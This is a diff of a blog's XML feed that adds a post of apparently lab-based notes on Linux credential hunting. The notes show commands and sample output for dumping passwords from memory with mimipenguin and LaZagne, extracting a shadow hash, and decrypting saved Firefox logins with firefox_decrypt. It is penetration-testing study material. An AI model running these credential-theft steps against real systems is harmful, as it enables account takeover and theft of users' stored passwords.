-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /etc/cron.*/</span><br><span class="line"></span><br><span class="line">/etc/cron.d/:</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 root root  106  3. Jan 20:27 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all</span><br><span class="line">-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate</span><br><span class="line">-rw-r--r-- 1 root root  607 25. Jan 2021  john</span><br><span class="line">-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm</span><br><span class="line">-rw-r--r-- 1 root root  712 11. Mai 2020  php</span><br><span class="line">-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder</span><br><span class="line">-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/:</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x 1 root root  252  6. Jan 16:24 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>config-files</tag>
-        <tag>history-file</tag>
-        <tag>db-files</tag>
-        <tag>cronjobs-enumeration</tag>
       </tags>
   </entry>
   <entry>
@@ -718,6 +683,41 @@
       <tags>
         <tag>Lazagne</tag>
         <tag>Search-for-File-Content</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux Memory-Cache-Browser Credentials Hunting</title>
+    <url>/2025/11/27/Memory-and-cache/</url>
+    <content><![CDATA[<h2 id="Mimipenguin-root-access-is-required"><a href="#Mimipenguin-root-access-is-required" class="headerlink" title="Mimipenguin ( root access is required )"></a>Mimipenguin ( root access is required )</h2><p>➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 mimipenguin.py</span><br><span class="line"></span><br><span class="line">[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY</span><br></pre></td></tr></table></figure>
+
+<h2 id="LaZagne-Root-recommended-but-not-always-required"><a href="#LaZagne-Root-recommended-but-not-always-required" class="headerlink" title="LaZagne ( Root recommended, but not always required )"></a>LaZagne ( Root recommended, but not always required )</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python2.7 laZagne.py all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------- Shadow passwords -----------------</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: systemd-coredump</span><br><span class="line">Hash: !!:18858::::::</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: sambauser</span><br><span class="line">Hash: $6<span class="variable">$wgK4tGq7Jepa</span>.V0g<span class="variable">$QkxvseL</span>.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::</span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">Login: cry0l1t3</span><br><span class="line">Password: WLpAEXFa0SbqOHY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] 3 passwords have been found.</span><br><span class="line">For more information launch it again with the -v option</span><br><span class="line"></span><br><span class="line">elapsed <span class="keyword">time</span> = 3.50091600418</span><br></pre></td></tr></table></figure>
+
+
+<p>LaZagne without root</p>
+<ul>
+<li><code>browser passwords (if user profile is readable)</code></li>
+<li><code>Git credentials</code></li>
+<li><code>SSH keys</code></li>
+<li><code>environment variables</code></li>
+<li><code>configuration files</code></li>
+</ul>
+<h2 id="Browser-redentials"><a href="#Browser-redentials" class="headerlink" title="Browser redentials"></a>Browser redentials</h2><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>By default, Firefox stores saved credentials in an encrypted file named <code>logins.json</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l .mozilla/firefox/ | grep default </span><br><span class="line"></span><br><span class="line">drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release</span><br><span class="line">drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;nextId&quot;</span>: 2,</span><br><span class="line">  <span class="string">&quot;logins&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;hostname&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;httpRealm&quot;</span>: null,</span><br><span class="line">      <span class="string">&quot;formSubmitURL&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usernameField&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">      <span class="string">&quot;passwordField&quot;</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedUsername&quot;</span>: <span class="string">&quot;MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedPassword&quot;</span>: <span class="string">&quot;MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=&quot;</span>,</span><br><span class="line">      <span class="string">&quot;guid&quot;</span>: <span class="string">&quot;&#123;412629aa-4113-4ff9-befe-dd9b4ca388e2&#125;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encType&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;timeCreated&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timeLastUsed&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timePasswordChanged&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timesUsed&quot;</span>: 1</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;potentiallyVulnerablePasswords&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;dismissedBreachAlertsByLoginGUID&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>To decrypt saved credentials we can use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3.9 firefox_decrypt.py</span><br><span class="line"></span><br><span class="line">Select the Mozilla profile you wish to decrypt</span><br><span class="line">1 -&gt; lfx3lvhb.default</span><br><span class="line">2 -&gt; 1bplpd86.default-release</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Website:   https://testing.dev.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">Website:   https://www.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;cry0l1t3&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;FzXUxJemKm6g2lGh&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Linux</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>browser-credentials</tag>
+        <tag>LaZagne</tag>
+        <tag>Mimipenguin</tag>
       </tags>
   </entry>
   <entry>
